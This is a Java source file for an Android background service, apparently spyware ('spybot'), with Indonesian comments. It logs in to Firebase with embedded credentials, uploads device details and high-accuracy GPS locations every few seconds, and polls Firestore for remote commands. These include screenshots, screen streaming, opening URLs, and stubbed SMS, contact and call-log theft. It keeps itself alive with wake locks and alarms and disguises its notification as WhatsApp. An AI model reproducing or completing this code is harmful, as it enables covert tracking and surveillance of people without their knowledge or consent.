package com.example.spy.services;


import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import com.example.spy.R;
import com.example.spy.activities.ScreenProjectionActivity;
import com.example.spy.device.hardware.DeviceState;
import com.example.spy.models.Command;
import com.example.spy.models.Location;
import com.example.spy.utils.AppController;
import com.example.spy.utils.Constants;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.firestore.EventListener;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.FirebaseFirestoreException;
import com.google.firebase.firestore.Query;
import com.google.firebase.firestore.QueryDocumentSnapshot;
import com.google.firebase.firestore.QuerySnapshot;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import github.nisrulz.easydeviceinfo.base.EasyIdMod;
import io.reactivex.rxjava3.disposables.Disposable;

public class CommandService extends Service {
    String tag = "spybot";
    SharedPreferences prefs = new AppController().getContext().getSharedPreferences("com.android.spy", Context.MODE_PRIVATE);
    PowerManager powerManager = (PowerManager) new AppController().getContext().getSystemService(Context.POWER_SERVICE);
    PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE, "com.android.spybot:commandService");
    private Disposable disposable = null;

    EasyIdMod easyIdMod = new EasyIdMod(new AppController().getContext());
    String gsf_id = easyIdMod.getGSFID();

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(tag, "On create Called");

        FirebaseFirestore.getInstance();


        doWork(Constants.DEVELOPMENT_SERVER);

        //if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) startForeground();

        setRepeatingAlarm();
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        Log.i(tag, "Running onStartCommand");
        //Log.i(tag, "\n\n\nSocket is " + if (Constants.socket?.connected() == true) "connected" else "not connected\n\n\n");

        startTimer();

        return Service.START_STICKY;
    }


    public void doWork(String server) {

        if (disposable == null || disposable.isDisposed()) {
            //FirebaseDatabase.getInstance().getReference().child(userEmail);

            loginToFirebase();

        }

    }

    private void loginToFirebase() {
        // Authenticate with Firebase, and request location updates
        String email = getString(R.string.firebase_email);
        String password = getString(R.string.firebase_password);
        FirebaseAuth.getInstance().signInWithEmailAndPassword(
                email, password).addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                Log.d(tag, "firebase auth success");
                try{
                    requestCommandUpdates();
                    requestLocationUpdates();
                }catch (Exception e){
                    e.printStackTrace();
                    loginToFirebase();
                }
            } else {
                Log.d(tag, "firebase auth failed");
            }
        });
    }

    private void requestCommandUpdates(){


        FirebaseFirestore.getInstance()
                .collection("users")
                .document(getString(R.string.firebase_email))
                .collection("perangkat")
                .document(gsf_id)
                .set(new DeviceState(new AppController().getContext()).getData());

        FirebaseFirestore.getInstance()
                .collection("users")
                .document(getString(R.string.firebase_email))
                .collection("perangkat")
                .document(gsf_id)
                .collection("commands")
                .whereEqualTo("status","0")
                .addSnapshotListener((snapshot, error) -> {
                    if (error != null) {
                        Log.w(tag, "Listen failed.", error);
                        return;
                    }
                    try{
                        for (QueryDocumentSnapshot doc : snapshot) {

                            Command p = doc.toObject(Command.class);
                            p.setKey( doc.getId() );

                            if(!p.command.isEmpty() && p.status.equalsIgnoreCase("0")){
                                //Log.e(tag, "Command: " + p.command);


                                runTheCommend(p);



                            }
                        }
                    }catch (Exception ex){
                        ex.printStackTrace();
                    }

                });




    }

    private void requestLocationUpdates() {
        int jarak = 5;
        int interval = 5;


        LocationRequest request = new LocationRequest();
        request.setInterval(interval*1000); //update lokasi 10 detik
        request.setFastestInterval(interval*1000); //dapat update dari aplikasi lain yg lebih cepat 10 detik
        //request.setSmallestDisplacement(1); //diupdate jika berpindah 1 meter
        request.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);


        FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(this);
        int permission = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION);
        if(permission == PackageManager.PERMISSION_GRANTED) {



            client.requestLocationUpdates(request, new LocationCallback() {

                @Override
                public void onLocationResult(LocationResult locationResult) {
                    List<android.location.Location> locationList = locationResult.getLocations();
                    if (locationList.size() > 0) {
                        android.location.Location locationCurrent = locationList.get(locationList.size() - 1);


                        double latitude = locationCurrent.getLatitude();
                        double longitude = locationCurrent.getLongitude();

                        double lastlatitude = Double.parseDouble(prefs.getString("lastlatitude","0"));
                        double lastlongitude = Double.parseDouble(prefs.getString("lastlongitude","0"));

                        android.location.Location startPoint=new android.location.Location("LokasiA");
                        startPoint.setLatitude(latitude);
                        startPoint.setLongitude(longitude);

                        android.location.Location endPoint = new android.location.Location("LokasiB");
                        endPoint.setLatitude(lastlatitude);
                        endPoint.setLongitude(lastlongitude);

                        double distance = startPoint.distanceTo(endPoint);

                        //Log.d(tag, "location update last " + endPoint);
                        if(distance > jarak) {
                            Log.d(tag, "location update new" + startPoint);
                            Log.d(tag, "location dest " + distance);

                            SharedPreferences.Editor editor = prefs.edit();
                            editor.putString("lastlatitude", String.valueOf(latitude));
                            editor.putString("lastlongitude", String.valueOf(longitude));
                            editor.apply();



                            Calendar myCalendar = Calendar.getInstance();
                            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                            String dateToday = sdf.format(new Date());


                            FirebaseFirestore.getInstance()
                                    .collection("users")
                                    .document(getString(R.string.firebase_email))
                                    .collection("perangkat")
                                    .document(gsf_id)
                                    .collection("lokasi")
                                    .add(new Location(
                                            String.valueOf(locationCurrent.getLatitude()),
                                            String.valueOf(locationCurrent.getLongitude()),
                                            dateToday
                                    ));
                        }

                    }


                }
            },null);
        }
    }

    private void runTheCommend(Command cmd){

        String command = cmd.command;
        Log.i(tag, "\nCommand: " + command + "\n");


        switch (command) {

            case "getSms" :
                //int arg1 = Integer.parseInt(cmd.arg1);
                //SmsTask(this, arg1, socket).start()
                break;
            case "getCallHistory" :

                //int arg1 = Integer.parseInt(cmd.arg1);
                //CallLogsTask(this, arg1, socket).start()
                break;
            case "getContacts" :

                //ContactsTask(this, socket).start()
                break;
            case "addContact" :

                String phone = cmd.arg1;
                String name = cmd.arg2;
                //AddNewContact(this, phone, name).start()
                break;
            case "getLocation" :

                //LocationMonitor(this, socket).start()
                break;
            case "sendSms" :

                String phoneNumber = cmd.arg1;
                String textMessage = cmd.arg2;
                //SendSmsTask(this, textMessage, phoneNumber, socket).start()
                break;
            case "getImages" :

                //PhotosTask(this, socket).start()
                break;
            case "downloadImage" :

                String path = cmd.arg1;
                //DownloadImage(this, socket, path).start()
                break;
            case "openBrowser" :


                String url = cmd.arg1;

                startActivity(
                        new Intent(Intent.ACTION_VIEW)
                                .setData(Uri.parse("http://" + url))
                                .setPackage("com.android.chrome")
                );

                break;
            case "takeScreenShot" :


                startActivity(
                        new Intent(this, ScreenProjectionActivity.class)
                );

                break;
            case "streamScreen" :

                startActivity(
                        new Intent(this, ScreenProjectionActivity.class)
                                .putExtra("streamScreen", true)
                );

                break;
            case "streamCamera" :

                //I don't know how to stream yet!
                break;
            case "openApp" :

                String appPackage = cmd.arg1;
                //val intent: Intent = packageManager.getLaunchIntentForPackage(appPackage)
                //startActivity(intent)
                break;
            case "openWhatsApp" :

                String number = cmd.arg1;
                String text = cmd.arg2;
                //startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://api.whatsapp.com/send?phone=$number&text=$text")))

                break;
            case "makeCall" :

                //String number = cmd.arg1;
                //String intent = new Intent(Intent.ACTION_CALL);
                //intent.data = Uri.parse("tel:$number")
               // if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED)
                    //startActivity(intent)
                break;
            case "notification" :

                // Way too long
                break;
            case "fileExplorer" :

                // It will take long
                break;
            case "clientID" :

                String clientID = cmd.arg1;
                prefs.edit().putString("clientID", clientID).commit();
                Log.d(tag, "ClientID: $clientID");
                break;
            case "stopAll" :

                //PhotosTask.flag = false
                //StreamScreen.flagStop = true
                //LocationMonitor.locationUpdates = false
                break;

            default:

                Log.i(tag, "Unknown command");
                //JSONObject xcmd = new JSONObject();
                //xcmd.put("event", "command:unknown");
                //xcmd.put("uid", params.uid);
                //xcmd.put("device", params.device);
                //xcmd.put("command", command);

                break;
        }
    }

    @Override
    public void onDestroy() {
        wakeLock.release();
        Log.d(tag, "On destroy Called");
        super.onDestroy();

        stoptimertask();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        wakeLock.release();
        Log.d(tag, "On task removed Called");
        super.onTaskRemoved(rootIntent);
    }

    public void setRepeatingAlarm() {

        Intent intent = new Intent(this, MyReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 99, intent, PendingIntent.FLAG_UPDATE_CURRENT);

        AlarmManager alarmManager = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmManager.cancel(pendingIntent);
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60 * 1000, 10 * 60 * 1000, pendingIntent);

    }

    public void startForeground() {

        Notification notification = new NotificationCompat.Builder(this, "channelId")
                .setSmallIcon(R.drawable.ic_whatsapp)
                .setContentTitle("WhatsApp")
                .setContentText("Checking for new messages...")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();

        startForeground(98, notification);
    }




    private int counter = 0;
    private Timer timer;
    private TimerTask timerTask;

    public void startTimer() {
        //set a new Timer
        timer = new Timer();

        //initialize the TimerTask's job
        initializeTimerTask();

        //schedule the timer, to wake up every 1 second
        timer.schedule(timerTask, 10000, 10000); //
    }

    public void initializeTimerTask() {
        timerTask = new TimerTask() {
            public void run() {
                Log.i("in timer", "in timer ++++  " + (counter++));

                if(counter > 100) counter = 0;
            }
        };
    }

    public void stoptimertask() {
        //stop the timer, if it's not already null
        if (timer != null) {
            timer.cancel();
            timer = null;
        }
    }

}
